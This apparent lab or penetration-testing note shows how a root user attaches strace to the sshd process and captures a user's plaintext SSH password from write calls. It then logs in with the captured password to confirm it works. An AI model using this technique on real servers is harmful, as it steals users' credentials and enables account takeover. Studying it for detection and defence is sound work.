# SSH Password Sniffing
## System Call Tracing

Trace the `write` system call of the SSH server process `sshd`:

```shell-session
root@linux-srv-02:~# sudo strace -p "$(pgrep -f /usr/sbin/sshd)" -f -e trace=write
strace: Process 7 attached
strace: Process 1474 attached
[...]
[pid  1474] write(8, "SSH-2.0-OpenSSH_10.0p2\r\n", 24) = 24
[...]
[pid  1475] write(6, "E\301\372\21u\261\366\220\343\262m\203\320[\355&\226\203\327;(\3313R\310\35\262\355N\236S\317"..., 44) = 44
[pid  1475] write(3, "\0\0\0\n\10", 5)  = 5
[pid  1475] write(3, "\0\0\0\5alice", 9) = 9
[pid  1474] write(10, "\0\0\f\231\t", 5) = 5
[...]
[pid  1475] write(3, "\0\0\0\31\f", 5)  = 5
[pid  1475] write(3, "\0\0\0\24puffy-beastie-tux-23", 24) = 24
strace: Process 1476 attached
[pid  1474] write(12, "puffy-beastie-tux-23", 20) = 20
[pid  1474] write(12, "\0", 1)          = 1
[...]
[pid  1475] write(3, "Accepted password for alice from"..., 61) = 61
[...]
^C
```

- The output shows lots of information. However, some strings stand out.
- The SSH server banner can be seen.
- The username `alice` can be seen.
- A string `puffy-beastie-tux-23` looking like a password can be seen. This is probably the entered password by `alice`

## Verify Password

Login on `linux-srv-02` as `alice` to verify if this is the correct password:

```shell-session
root@linux-srv-02:~# ssh alice@localhost
[...]
alice@localhost's password: ******************** (puffy-beastie-tux-23)
[...]

alice@linux-srv-02:~$ hostname
linux-srv-02.nullbyte.internal

alice@linux-srv-02:~$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice)
```

- The password is correct.

Go back to the attacker machine:

```shell-session
alice@linux-srv-02:~$ exit
logout
Connection to localhost closed.

root@linux-srv-02:~# 
```